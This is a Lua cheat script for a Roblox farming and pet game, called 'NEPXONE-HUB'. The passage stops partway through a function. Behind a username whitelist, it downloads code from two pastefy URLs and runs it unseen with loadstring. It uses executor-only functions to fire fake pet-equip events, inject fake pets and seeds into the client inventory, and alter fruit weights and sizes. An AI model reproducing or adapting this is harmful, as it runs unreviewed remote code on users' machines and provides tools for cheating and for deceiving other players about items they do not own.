-- NEPXONE-HUB Whitelist + Per-Username Runtime Expiry (LocalScript)
-- Behavior:
--  - checks whitelist
--  - supports per-user expiry and global expiry
--  - if expired: show "You are not whitelisted", copy discord invite (if possible), show message and then kick the player
--  - places: StarterPlayerScripts or a LocalScript parented to PlayerGui

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer or Players:WaitForChild("LocalPlayer", 10)

-- ========================= CONFIG ========================= --
local WHITELISTED_USERS = {
    "BlueberryOx23",
    "ajap398pa",
    "troll_0923",
    "ejoox",
    "SerenePlume19",
    "HeneralNaPang05",
    "cedric098709",
    "ajap398",
    "R1ZU01",
    "Yussop833",
    "BlackCloverOx",
    "kayagi_1234",
    "Nottheusualdomeng",
    "Blue_hadog",
    "Nottheusualdomeng6",
}

-- Per-username expiry (case-insensitive keys). 0 = never expire for that user.
local PER_USER_EXPIRY = {
    -- ["someUser"] = 0,
    -- ["limitedUser"] = 1710000000,
}

-- Global expiry fallback (0 disables)
local EXPIRY_UNIX = 0

-- Discord invite used in denied UI and to copy
local DISCORD_INVITE = "https://discord.gg/r3mUSu9rvx"

-- How long (seconds) to show the denied/expired UI before kicking
local KICK_DELAY_SECONDS = 4

-- ========================= UTIL ========================= --
local function lower(s) return tostring(s):lower() end

local PER_USER_EXPIRY_NORM = {}
for k, v in pairs(PER_USER_EXPIRY) do
    PER_USER_EXPIRY_NORM[lower(k)] = tonumber(v) or 0
end

local function isWhitelisted(username)
    if not username then return false end
    local u = lower(username)
    for _, v in ipairs(WHITELISTED_USERS) do
        if lower(v) == u then return true end
    end
    return false
end

local function clipboardCopy(text)
    if not text then return false end
    if setclipboard then
        local ok, _ = pcall(setclipboard, text)
        return ok
    end
    return false
end

local function formatUnix(ts)
    if not ts or ts <= 0 then return "never" end
    local t = os.date("!*t", ts)
    return string.format("%04d-%02d-%02d %02d:%02d UTC", t.year, t.month, t.day, t.hour, t.min)
end

local function getExpiryForUser(username)
    if not username then return tonumber(EXPIRY_UNIX) or 0 end
    local u = lower(username)
    if PER_USER_EXPIRY_NORM[u] ~= nil then
        return PER_USER_EXPIRY_NORM[u]
    end
    return tonumber(EXPIRY_UNIX) or 0
end

-- ========================= UI CREATION ========================= --
local function makeCheckGUI()
    -- ensure LocalPlayer exists
    LocalPlayer = LocalPlayer or Players.LocalPlayer or Players:WaitForChild("LocalPlayer", 10)
    local gui = Instance.new("ScreenGui")
    gui.Name = "NEPXONE_Whitelist"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.IgnoreGuiInset = true
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)

    local parent = LocalPlayer:FindFirstChild("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
    gui.Parent = parent

    local bg = Instance.new("Frame")
    bg.Size = UDim2.fromScale(1, 1)
    bg.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
    bg.BorderSizePixel = 0
    bg.Parent = gui

    local card = Instance.new("Frame")
    card.AnchorPoint = Vector2.new(0.5, 0.5)
    card.Position = UDim2.fromScale(0.5, 0.5)
    card.Size = UDim2.fromOffset(520, 240)
    card.BackgroundColor3 = Color3.fromRGB(30, 30, 34)
    card.BorderSizePixel = 0
    card.Parent = bg
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)
    local stroke = Instance.new("UIStroke"); stroke.Color = Color3.fromRGB(140, 18, 30); stroke.Thickness = 2; stroke.Parent = card

    local title = Instance.new("TextLabel")
    title.Position = UDim2.fromOffset(20, 16)
    title.Size = UDim2.new(1, -40, 0, 28)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.Text = "NEPXONE-HUB"
    title.TextSize = 20
    title.TextColor3 = Color3.fromRGB(245, 245, 245)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = card

    local status = Instance.new("TextLabel")
    status.Position = UDim2.fromOffset(20, 74)
    status.Size = UDim2.new(1, -40, 0, 22)
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.GothamMedium
    status.Text = "Checking..."
    status.TextSize = 14
    status.TextColor3 = Color3.fromRGB(232, 96, 114)
    status.TextXAlignment = Enum.TextXAlignment.Left
    status.Parent = card

    local progressBG = Instance.new("Frame")
    progressBG.Position = UDim2.fromOffset(20, 108)
    progressBG.Size = UDim2.new(1, -40, 0, 20)
    progressBG.BackgroundColor3 = Color3.fromRGB(18, 18, 20)
    progressBG.BorderSizePixel = 0
    progressBG.Parent = card
    Instance.new("UICorner", progressBG).CornerRadius = UDim.new(0, 8)
    Instance.new("UIStroke", progressBG).Color = Color3.fromRGB(40,40,46)

    local progressFill = Instance.new("Frame")
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(196, 30, 58)
    progressFill.BorderSizePixel = 0
    progressFill.Parent = progressBG
    Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 6)

    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.fromScale(1, 1)
    percent.BackgroundTransparency = 1
    percent.Font = Enum.Font.GothamBold
    percent.Text = "0%"
    percent.TextSize = 12
    percent.TextColor3 = Color3.fromRGB(245, 245, 245)
    percent.Parent = progressBG

    local info = Instance.new("TextLabel")
    info.Position = UDim2.fromOffset(20, 140)
    info.Size = UDim2.new(1, -40, 0, 36)
    info.BackgroundTransparency = 1
    info.Font = Enum.Font.Gotham
    info.Text = "Player: " .. tostring(LocalPlayer and LocalPlayer.Name or "Unknown") .. "  (ID: " .. tostring(LocalPlayer and LocalPlayer.UserId or "?") .. ")"
    info.TextSize = 12
    info.TextColor3 = Color3.fromRGB(170, 170, 175)
    info.TextWrapped = true
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.Parent = card

    local footer = Instance.new("TextLabel")
    footer.Position = UDim2.fromOffset(20, 184)
    footer.Size = UDim2.fromOffset(480, 28)
    footer.BackgroundTransparency = 1
    footer.Font = Enum.Font.Gotham
    footer.Text = ""
    footer.TextSize = 12
    footer.TextColor3 = Color3.fromRGB(200, 200, 200)
    footer.TextWrapped = true
    footer.TextXAlignment = Enum.TextXAlignment.Left
    footer.Parent = card

    return {
        ScreenGui = gui,
        Status = status,
        ProgressFill = progressFill,
        Percent = percent,
        Footer = footer,
    }
end

-- returns the AccessDenied screen and the copyStatus label for later updates
local function createDeniedGuiWithStatus(reasonText)
    LocalPlayer = LocalPlayer or Players.LocalPlayer or Players:WaitForChild("LocalPlayer", 10)
    local gui = Instance.new("ScreenGui")
    gui.Name = "NEPXONE_AccessDenied"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.IgnoreGuiInset = true
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    local parent = LocalPlayer:FindFirstChild("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
    gui.Parent = parent

    local bg = Instance.new("Frame")
    bg.Size = UDim2.fromScale(1,1)
    bg.BackgroundColor3 = Color3.fromRGB(10,10,12)
    bg.BorderSizePixel = 0
    bg.Parent = gui

    local card = Instance.new("Frame")
    card.AnchorPoint = Vector2.new(0.5, 0.5)
    card.Position = UDim2.fromScale(0.5, 0.5)
    card.Size = UDim2.fromOffset(480, 260)
    card.BackgroundColor3 = Color3.fromRGB(28,28,32)
    card.BorderSizePixel = 0
    card.Parent = bg
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)
    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(176, 32, 32); s.Thickness = 2; s.Parent = card

    local title = Instance.new("TextLabel")
    title.Position = UDim2.fromOffset(20, 18)
    title.Size = UDim2.new(1, -40, 0, 32)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.Text = "✖ ACCESS DENIED"
    title.TextSize = 22
    title.TextColor3 = Color3.fromRGB(220, 100, 100)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = card

    local msg = Instance.new("TextLabel")
    msg.Position = UDim2.fromOffset(20, 56)
    msg.Size = UDim2.new(1, -40, 0, 56)
    msg.BackgroundTransparency = 1
    msg.Font = Enum.Font.Gotham
    msg.Text = reasonText or "You do not have access to NEPXONE-HUB."
    msg.TextSize = 14
    msg.TextColor3 = Color3.fromRGB(220,220,220)
    msg.TextWrapped = true
    msg.TextXAlignment = Enum.TextXAlignment.Left
    msg.Parent = card

    local discordBtn = Instance.new("TextButton")
    discordBtn.Position = UDim2.fromOffset(20, 120)
    discordBtn.Size = UDim2.fromOffset(440, 44)
    discordBtn.BackgroundColor3 = Color3.fromRGB(88,101,242)
    discordBtn.BorderSizePixel = 0
    discordBtn.Font = Enum.Font.GothamBold
    discordBtn.Text = "COPY DISCORD LINK"
    discordBtn.TextSize = 15
    discordBtn.TextColor3 = Color3.fromRGB(255,255,255)
    discordBtn.Parent = card
    Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0, 8)

    local copyStatus = Instance.new("TextLabel")
    copyStatus.Position = UDim2.fromOffset(20, 174)
    copyStatus.Size = UDim2.fromOffset(440, 20)
    copyStatus.BackgroundTransparency = 1
    copyStatus.Font = Enum.Font.Gotham
    copyStatus.Text = ""
    copyStatus.TextSize = 13
    copyStatus.TextColor3 = Color3.fromRGB(100,220,130)
    copyStatus.TextWrapped = true
    copyStatus.TextXAlignment = Enum.TextXAlignment.Left
    copyStatus.Parent = card

    discordBtn.MouseButton1Click:Connect(function()
        if clipboardCopy(DISCORD_INVITE) then
            copyStatus.Text = "✔ Discord link copied to clipboard"
            copyStatus.TextColor3 = Color3.fromRGB(100,220,130)
            task.delay(3, function() copyStatus.Text = "" end)
        else
            copyStatus.Text = "✖ Unable to copy (setclipboard not available)"
            copyStatus.TextColor3 = Color3.fromRGB(220,100,100)
        end
    end)

    return gui, copyStatus
end

-- ========================= HUB (loadHub) ========================= --
-- The spawner and hub logic is wrapped inside loadHub() and will only run after the whitelist/security checks pass.
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function loadHub()
    local t1 = {}
    local t2 = {}
    if not pcall(function()
        local v46, v47, v48 = utf8.graphemes("To complex for me to give out source")
        local v49, _ = v46(v47, v48)

        if v49 then
            return v49
        end
    end) then
        error("To complex for me to give out source")
    end

    t1[1] = "https://pastefy.app/jSIFTAqH/raw"
    t1[2] = "https://pastefy.app/tCzM7AZR/raw"

    for _, v in ipairs(t1) do
        local _pcall = pcall
        local u17 = v
        local v18, _ = pcall(function()
            local v140 = game:HttpGet(u17)
            loadstring(v140)()
        end)

        if not v18 then
            warn("[Loader] Failed to load ")
        end
    end

    local t2 = {
        Common = true,
        Uncommon = true,
        Rare = true,
        Epic = true,
        Legendary = true,
        Mythic = true,
        Super = true,
        Secret = true,
    }
    t2[1] = game:GetService("Players")
    t2[2] = game:GetService("RunService")
    t2[3] = game:GetService("HttpService")
    t2[4] = game:GetService("UserInputService")
    t2[5] = game:GetService("TweenService")

    local WeightFormat = require(ReplicatedStorage.SharedModules.WeightFormat)
    -- color palette adjusted to red/ruby theme
    local color3 = Color3.fromRGB(13, 13, 18)
    local color3_2 = Color3.fromRGB(35, 35, 48)
    local color3_3 = Color3.fromRGB(196, 30, 58)   -- accent -> red
    local color3_4 = Color3.fromRGB(220, 80, 100)  -- accent hover -> lighter red
    local color3_5 = Color3.fromRGB(255, 255, 255)
    local color3_6 = Color3.fromRGB(170, 170, 170)
    local color3_7 = Color3.fromRGB(90, 90, 120)

    t2[6] = {
        Background = color3,
        Secondary = color3_2,
        Accent = color3_3,
        AccentHover = color3_4,
        Text = color3_5,
        SubText = color3_6,
        Stroke = color3_7
    }
    t2[7] = {}
    t2[8] = WeightFormat.FormatGrams
    function WeightFormat.FormatGrams(p1)
        local v52 = tonumber(p1) or 0
        local PlantHoverTooltip = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("PlantHoverTooltip")

        if PlantHoverTooltip then
            local Frame = PlantHoverTooltip:FindFirstChild("Frame")

            if Frame then
                local Name = Frame:FindFirstChild("Name")
                local v56 = Name

                if Name then
                    v56 = t2[7][Name.Text]
                end

                if v56 then
                    return t2[8](v52 * t2[7][Name.Text])
                end
            end
        end

        return t2[8](v52)
    end
    t2[9] = t2[1].LocalPlayer
    t2[10] = t2[9]:GetAttribute("PlotId")
    t2[11] = nil
    t2[12] = function(p2)
        return p2:GetAttribute("SeedName") or p2.Name
    end
    t2[13] = function(p3)
        local v63 = p3:FindFirstChild("Fruits") or p3

        for _, descendant in pairs(v63:GetDescendants()) do
            if descendant:IsA("BasePart") then
                descendant.Size = descendant.Size * 5
            end
        end
    end
    local WaitForChild = ReplicatedStorage.WaitForChild
    t2[14] = function(p4)
        return (tonumber((p4:match("%[(.-)kg%]"))))
    end
    t2[15] = function(p5)
        if p5:GetAttribute("Fruit") == nil then
            return
        end

        local SeedName = p5:GetAttribute("SeedName")

        if not SeedName then
            SeedName = p5.Name:match("^(.-)%s*%[")
        end

        local v68 = SeedName and t2[7][SeedName] or 1
        local v69 = t2[14](p5.Name)

        if not v69 then
            return
        end

        local v70 = v69 * v68

        p5:SetAttribute("Weight", v70)
        p5.Name = p5.Name:gsub("%[.-%]", "[" .. string.format("%.2f", v70) .. "kg]")
    end

    t2[11] = {}
    t2[16] = function(p6)
        if t2[11][p6] then
            return
        end

        local Owner = p6:GetAttribute("Owner")
        local v61 = not Owner

        if not v61 then
            v61 = Owner ~= t2[9].UserId
        end

        if v61 then
            return
        end

        task.spawn(function()
            local v367 = os.clock() + 5
            local g374
            while v367 > os.clock() do
                local descendants = p6:GetDescendants()
                local v369 = false
                local v370, v371, v372 = pairs(descendants)

                repeat
                    local v373

                    v372, v373 = v370(v371, v372)

                    if not v372 then
                        g374 = true
                    end

                    if g374 then
                        break
                    end
                until v373:IsA("BasePart")

                if not g374 then
                    v369 = true
                end

                g374 = false

                if v369 then
                    break
                end

                task.wait(0.1)
            end
            if t2[11][p6] then
                return
            end
            local Model = p6:FindFirstChildWhichIsA("Model")
            if not Model then
                return
            end
            local SeedName = Model:GetAttribute("SeedName")
            if not SeedName then
                return
            end
            local v377 = t2[7][SeedName] or 1
            if v377 == 1 then
                return
            end
            t2[11][p6] = true
            for _, descendant in pairs(p6:GetDescendants()) do
                if descendant:IsA("BasePart") then
                    descendant.Size = descendant.Size * v377
                end
            end
        end)
    end
    t2[17] = require(WaitForChild(ReplicatedStorage, "SharedModules"):WaitForChild("PetModules"))
    t2[18] = require(ReplicatedStorage:WaitForChild("SharedData"):WaitForChild("PetData"))
    t2[19] = require(ReplicatedStorage:WaitForChild("SharedData"):WaitForChild("PetSizes"))

    local PetTypes = require(ReplicatedStorage:WaitForChild("SharedData"):WaitForChild("PetTypes"))
    local WaitForChild2 = ReplicatedStorage.WaitForChild
    t2[20] = PetTypes
    t2[21] = require(WaitForChild2(ReplicatedStorage, "SharedModules"):WaitForChild("Networking"))
    t2[22] = require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("PlayerStateClient"))
    t2[23] = ReplicatedStorage:WaitForChild("Assets")
    t2[24] = Instance.new("Folder")
    t2[24].Name = "HiddenPets"
    t2[24].Parent = t2[9]
    t2[25] = {}
    t2[26] = {}
    t2[27] = {}
    t2[28] = {}
    local t3 = {
        {
            X = -4,
            Z = 5
        },
        {
            X = 0,
            Z = 5
        },
        {
            X = 4,
            Z = 5
        },
        {
            X = -6,
            Z = 8
        },
        {
            X = 0,
            Z = 8
        },
        {
            X = 6,
            Z = 8
        },
        {
            X = -8,
            Z = 11
        },
        {
            X = -4,
            Z = 11
        },
        {
            X = 4,
            Z = 11
        },
        {
            X = 8,
            Z = 11
        }
    }
    t2[29] = nil
    t2[29] = t3
    t2[30] = function()
        local t4 = {}
        for v78, v79 in pairs(t2[27]) do

            if v79.idx then
                t4[v79.idx] = true
            end
        end
        for i = 1, #t2[29] + 20 do
            local v81 = i

            if not t4[v81] then
                return v81
            end
        end

        return 1
    end
    t2[31] = RaycastParams.new()
    t2[31].FilterType = Enum.RaycastFilterType.Exclude
    t2[31].IgnoreWater = false
    t2[31].RespectCanCollide = false
    t2[32] = RaycastParams.new()
    local v16 = t2[32]
    local RaycastFilterType = Enum.RaycastFilterType
    t2[33] = nil
    v16.FilterType = RaycastFilterType.Exclude
    t2[32].IgnoreWater = false
    t2[32].RespectCanCollide = false;
    (function()
        local t5 = {}
        for v102, v103 in ipairs(t2[1]:GetPlayers()) do

            if v103.Character then
                table.insert(t5, v103.Character)
            end
        end
        local PlayerPetReferences = workspace:FindFirstChild("PlayerPetReferences")
        if PlayerPetReferences then
            table.insert(t5, PlayerPetReferences)
        end
        t2[31].FilterDescendantsInstances = t5
    end)()
    t2[34] = function(p7, p8)
        local vector3 = Vector3.new(p7.X, p8 + 200, p7.Z)
        local raycastResult = workspace:Raycast(vector3, Vector3.new(0, -600, 0), t2[31])

        if not raycastResult then
            return nil
        end

        local Instance2 = raycastResult.Instance

        if Instance2.Transparency < 0.99 and Instance2.CanCollide then
            return raycastResult.Position.Y
        end

        local v133 = table.clone(t2[31].FilterDescendantsInstances)

        table.insert(v133, Instance2)
        t2[32].FilterDescendantsInstances = v133

        for _ = 1, 8 do
            local raycastResult2 = workspace:Raycast(vector3, Vector3.new(0, -600, 0), t2[32])

            if not raycastResult2 then
                return nil
            end

            local v136 = raycastResult2.Instance.Transparency < 0.99

            if v136 then
                v136 = raycastResult2.Instance.CanCollide
            end

            if v136 then
                return raycastResult2.Position.Y
            end

            table.insert(v133, raycastResult2.Instance)
            t2[32].FilterDescendantsInstances = v133
        end

        return nil
    end
    t2[35] = function(p9, p10)
        local GetPivot = p9.GetPivot

        p9:PivotTo(p10)

        local PositionY = GetPivot(p9).Position.Y
        local n1 = 1e999

        for _, descendant in ipairs(p9:GetDescendants()) do
            if descendant:IsA("BasePart") and descendant.Transparency < 1 then
                local descendantCFrame = descendant.CFrame
                local descendantSize = descendant.Size
                local v114 = descendantSize.X * 0.5
                local v115 = descendantSize.Y * 0.5
                local v116 = descendantSize.Z * 0.5

                for i = -1, 1, 2 do
                    local v118 = i

                    for j = -1, 1, 2 do
                        local Y = (descendantCFrame * Vector3.new(v118 * v114, j * v115, -v116)).Y
                        local Y2 = (descendantCFrame * Vector3.new(v118 * v114, j * v115, v116)).Y

                        if n1 > math.min(Y, Y2) then
                            n1 = math.min(Y, Y2)
                        end
                    end
                end
            end
        end

        if n1 == 1e999 then
            return 0
        end

        return PositionY - n1
    end
    local function v18(p11)
        local v151 = p11.IsFlying == true
        local identity = CFrame.identity
        local elapsed = os.clock()

        return {
            CurrentState = "",
            AnimState = "",
            Tracks = {},
            Module = p11,
            IsFlyer = v151,
            FootOffset = 0,
            SpeciesPivotCFrame = identity,
            SmoothedSpeed = 0,
            LastVisualPos = nil,
            LastVisualTime = nil,
            SlotGroundCachedY = nil,
            SlotGroundCastNext = 0,
            LastGroundY = nil,
            LastChaseGroundY = nil,
            LastYaw = nil,
            FlightPhase = "Grounded",
            SlotHeightOffset = 0,
            LastMoveTime = elapsed,
            LandingScheduled = false,
            SwitchState = function(p12, p13)
                if p13 == "takeoff" then
                    local Animations = p12.Module.Animations

                    if Animations and not Animations.Takeoff then
                        p13 = "flying"
                    end
                end
                if p13 == p12.CurrentState then
                    return
                end
                local CurrentState = p12.CurrentState
                p12.CurrentState = p13
                local v391 = CurrentState == "landing" or (CurrentState ~= "takeoff" and 0.2 or 0.05)
                if p13 == "landing" then
                    v391 = 0.1
                end
                for _, v in pairs(p12.Tracks) do
                    if v.IsPlaying then
                        v:Stop(v391)
                    end
                end
                local Animations = p12.Module.Animations
                local Idle
                if Animations then
                    if p13 == "idle" then
                        Idle = Animations.Idle
                    elseif p13 == "walking" then
                        Idle = Animations.Walk
                    elseif p13 == "flying" then
                        Idle = Animations.Fly
                    elseif p13 == "flyidle" then
                        Idle = Animations.FlyIdle or Animations.Fly
                    elseif p13 == "landing" then
                        Idle = Animations.Land
                    elseif p13 == "takeoff" then
                        Idle = Animations.Takeoff
                    elseif p13 == "groundidle" then
                        Idle = Animations.GroundIdle or Animations.Idle
                    end
                end
                local v396 = Idle and p12.Tracks[Idle]
                if v396 then
                    local v397 = p13 ~= "landing" or p13 == "takeoff"
                    local v398 = v397 and 0.2

                    v396.Looped = v397
                    v396:Play(v398 or 0.05)
                end
            end
        }
    end
    t2[36] = function(p14, p15, p16, p17)
        local OnClientEvent = t2[21].Pets.PetEquipped.OnClientEvent
        local v127 = getrawmetatable(OnClientEvent)

        pcall(function()
            local Fire = v127.Fire
            local v381 = OnClientEvent
            local v382 = p14
            local v383 = p14
            local v384 = p15
            local v385 = p16 or "Normal"
            local v386 = p17 or ""

            Fire(v381, v382, {
                Id = v383,
                Name = v384,
                Size = v385,
                Type = v386
            })
        end)
    end
    t2[37] = function(p18)
        local OnClientEvent = t2[21].Pets.PetUnequipped.OnClientEvent
        local v149 = getrawmetatable(OnClientEvent)

        pcall(function()
            v149.Fire(OnClientEvent, p18)
        end)
    end
    t2[38] = function()
        local ok, result = pcall(function()
            return t2[9].PlayerGui.PetList.Frame.Header.TextLabel
        end)
        local v156 = not ok

        if not v156 then
            v156 = not result
        end

        if v156 then
            return 0, 3
        end

        local v157, v158 = result.Text:match("(%d+)/(%d+)")

        return tonumber(v157) or 0, tonumber(v158) or 3
    end
    t2[39] = nil
    t2[39] = function(p19)
        local OnClientEvent = t2[21].Notification.OnClientEvent
        local v88 = getrawmetatable(OnClientEvent)

        pcall(function()
            v88.Fire(OnClientEvent, p19)
        end)
    end
    t2[40] = function(p20, p21, p22, p23)
        local LocalReplica = t2[22]:GetLocalReplica()

        if not LocalReplica then
            return
        end

        local guid = t2[3]:GenerateGUID(false)
        local Pets = LocalReplica.Data.Inventory.Pets
        local v96 = p21 or "Normal"
        local v97 = p22 or ""

        Pets[guid] = {
            Id = guid,
            Name = p20,
            Size = v96,
            Type = v97,
            Equipped = false
        }
        t2[25][guid] = true

        if p23 then
            t2[26][guid] = p23
        end

        local head = LocalReplica.changed_listeners.head

        while head do
            pcall(head.listener, LocalReplica, {
                "Inventory",
                "Pets",
                guid
            })
            pcall(head.listener, LocalReplica, "Inventory")
            head = head.next
        end

        return guid
    end
    t2[33] = {}
    t2[41] = function(p24)
        local LocalReplica = t2[22]:GetLocalReplica()

        if not LocalReplica then
            return
        end

        if not LocalReplica.Data.Inventory.Seeds then
            LocalReplica.Data.Inventory.Seeds = {}
        end

        local v84 = LocalReplica.Data.Inventory.Seeds[p24]

        if type(v84) == "number" then
            LocalReplica.Data.Inventory.Seeds[p24] = v84 + 1
        else
            LocalReplica.Data.Inventory.Seeds[p24] = 1
        end

        t2[25][p24] = true

        local head = LocalReplica.changed_listeners.head

        while head do
            pcall(head.listener, LocalReplica, {
                "Inventory",
                "Seeds",
                p24
            })
            pcall(head.listener, LocalReplica, "Inventory")
            head = head.next
        end

        return p24
    end
    t2[42] = function(p25, p26)
        local LocalReplica = t2[22]:GetLocalReplica()

        if not LocalReplica then
            return
        end

        local v140 = math.max(1, tonumber(p26) or 1)
        local Seeds = LocalReplica.Data.Inventory.Seeds

        if Seeds then
            Seeds = type(LocalReplica.Data.Inventory.Seeds[p25]) == "number"
        end

        if Seeds then
            local v142 = LocalReplica.Data.Inventory.Seeds[p25] - v140

            if v142 <= 0 then
                LocalReplica.Data.Inventory.Seeds[p25] = nil
                t2[25][p25] = nil

                local v143 = t2[33][p25]

                if v143 and v143.Parent then
                    v143:Destroy()
                end

                t2[33][p25] = nil
            else
                LocalReplica.Data.Inventory.Seeds[p25] = v142

                local v144 = t2[33][p25]

                if v144 and v144.Parent then
                    v144:SetAttribute("Count", v142)
                end
            end
        else
            t2[25][p25] = nil

            local v145 = t2[33][p25]

            if v145 and v145.Parent then
                v145:Destroy()
            end

            t2[33][p25] = nil
        end

        local head = LocalReplica.changed_listeners.head

        while head do
            pcall(head.listener, LocalReplica, {
                "Inventory",
                "Seeds",
                p25
            })
            pcall(head.listener, LocalReplica, "Inventory")
            head = head.next
        end
    end
    t2[43] = function(p27)
        local LocalReplica = t2[22]:GetLocalReplica()
        if not LocalReplica then
            return
        end
        local Pets = LocalReplica.Data.Inventory.Pets
        local g169
        if Pets then
            Pets = LocalReplica.Data.Inventory.Pets[p27]
        end
        if Pets then
            LocalReplica.Data.Inventory.Pets[p27] = nil
        else
            local Seeds = LocalReplica.Data.Inventory.Seeds

            if Seeds then
                Seeds = LocalReplica.Data.Inventory.Seeds[p27]
            end

            if Seeds then
                LocalReplica.Data.Inventory.Seeds[p27] = nil
            end
        end
        t2[25][p27] = nil
        local head = LocalReplica.changed_listeners.head
        while head do
            pcall(head.listener, LocalReplica, {
                "Inventory",
                "Pets",
                p27
            })
            pcall(head.listener, LocalReplica, {
                "Inventory",
                "Seeds",
                p27
            })
            pcall(head.listener, LocalReplica, "Inventory")
            head = head.next
        end
        local v164 = t2[26][p27]
        t2[26][p27] = nil
        if v164 then
            local v165, v166, v167 = pairs(t2[27])
            local v168

            repeat
                v167, v168 = v165(v166, v167)

                if not v167 then
                    g169 = true
                end

                if g169 then
                    break
                end
            until v164 == v167:GetAttribute("PetId")

            if not g169 then
                v168.heartConn:Disconnect()
                v168.renderConn:Disconnect()

                local model = v168.model

                if model then
                    model = v168.model.Parent
                end

                if model then
                    v168.model:Destroy()
                end

                local fakePart = v168.fakePart

                if fakePart then
                    fakePart = v168.fakePart.Parent
                end

                if fakePart then
                    v168.fakePart:Destroy()
                end

                t2[27][v167] = nil
                v167.Parent = t2[9].Backpack
                t2[37](v164)
            end

            g169 = false

            for i = #t2[28], 1, -1 do
                local v173 = i

                if v164 == t2[28][v173]:GetAttribute("PetId") then
                    t2[28][v173]:Destroy()
                    table.remove(t2[28], v173)

                    return
                end
            end
        end
    end
    t2[44] = function(p28, p29, p30)
        if t2[27][p30] then
            return
        end
        local v177, v178 = t2[38]()
        if v178 <= v177 then
            t2[39]("You can only equip " .. v178 .. " pets at once.")

            return
        end
        local v179 = t2[30]()
        local v180 = t2[29][v179]
        local g215
        if not v180 then
            v180 = {
                X = (v179 - 5) * 4,
                Z = 11
            }
        end
        local v181 = v180
        local p29AssetName = t2[23].Pets:FindFirstChild(p29.AssetName)
        if not p29AssetName then
            return
        end
        local clone = p29AssetName:Clone()
        local RootPart = clone:FindFirstChild("RootPart")
        if not RootPart then
            RootPart = clone.PrimaryPart

            if not RootPart then
                RootPart = clone:FindFirstChildWhichIsA("BasePart")
            end
        end
        local v185 = RootPart
        if not v185 then
            clone:Destroy()

            return
        end
        clone.PrimaryPart = v185
        for _, descendant in ipairs(clone:GetDescendants()) do
            if descendant:IsA("BasePart") then
                descendant.CanCollide = false
                descendant.CanQuery = false
                descendant.Massless = true
                descendant.Anchored = false
            end
        end
        v185.Anchored = true
        local v188 = p30:GetAttribute("PetSize") or "Normal"
        local GetScale = t2[19].GetScale
        local BigScale = p29.BigScale
        local HugeScale = p29.HugeScale
        local v192 = GetScale(v188, {
            Big = BigScale,
            Huge = HugeScale
        })
        if v192 ~= 1 then
            clone:ScaleTo(v192)
        end
        local Pivot = p29.Pivot
        if Pivot then
            Pivot = CFrame.fromOrientation(math.rad(Pivot.X), math.rad(Pivot.Y), (math.rad(Pivot.Z)))
        end
        if not Pivot then
            Pivot = CFrame.identity
        end
        local v194 = Pivot
        local v195 = p29.IsFlying == true
        local v196 = p29.FollowSpeed or 14
        local v197 = t2[35](clone, v194)
        local Attachment = Instance.new("Attachment")
        Attachment.Name = "PetTarget"
        Attachment.CFrame = CFrame.new(0, v197, 0) * v194
        Attachment.Parent = v185
        local Character = t2[9].Character
        if Character then
            Character = Character:FindFirstChild("HumanoidRootPart")
        end
        if Character then
            clone:PivotTo(Character.CFrame * CFrame.new(v181.X, 0, v181.Z))
        end
        local _PetVisualClient = workspace:FindFirstChild("_PetVisualClient")
        clone.Parent = _PetVisualClient and _PetVisualClient:FindFirstChild("Models") or workspace
        local PetId = p30:GetAttribute("PetId")
        local v202 = "FakeSlot_" .. PetId
        clone:SetAttribute("Owner", t2[9].Name)
        clone:SetAttribute("OwnerSlot", v202)
        local Part
        local PlayerPetReferences = workspace:FindFirstChild("PlayerPetReferences")
        if PlayerPetReferences then
            PlayerPetReferences = PlayerPetReferences:FindFirstChild(t2[9].Name)
        end
        if PlayerPetReferences then
            Part = Instance.new("Part")
            Part.Name = v202
            Part.Size = Vector3.new(1, 1, 1)
            Part.Transparency = 1
            Part.CanCollide = false
            Part.Anchored = true
            Part:SetAttribute("PetSpecies", p28)
            Part:SetAttribute("PetSize", v188)
            Part:SetAttribute("PetType", p30:GetAttribute("PetType") or "")
            Part.Parent = PlayerPetReferences
        end
        local v205 = p30:GetAttribute("PetType") or ""
        if v205 == t2[20].Rainbow then
            clone:AddTag("PetRainbow")
        end
        local v206 = v18(p29)
        v206.FootOffset = v197
        v206.SpeciesPivotCFrame = v194
        v206.FlightPhase = "Grounded"
        v206.SlotHeightOffset = 0
        task.defer(function()
            local AnimationController = clone:FindFirstChildOfClass("AnimationController")

            if not AnimationController then
                AnimationController = Instance.new("AnimationController")
                AnimationController.Parent = clone
            end

            local Animator = AnimationController:FindFirstChildOfClass("Animator")

            if not Animator then
                Animator = Instance.new("Animator")
                Animator.Parent = AnimationController
            end

            local Animations = clone:FindFirstChild("Animations")

            if Animations then
                for _, child in ipairs(Animations:GetChildren()) do
                    local v404 = child

                    if v404:IsA("Animation") then
                        local ok, result = pcall(function()
                            return Animator:LoadAnimation(v404)
                        end)

                        if ok and result then
                            result.Looped = true
                            result.Priority = Enum.AnimationPriority.Movement
                            v206.Tracks[v404.Name] = result
                        end
                    end
                end
            end

            v206.CurrentState = ""
            v206:SwitchState(not v195 and "idle" or "groundidle")
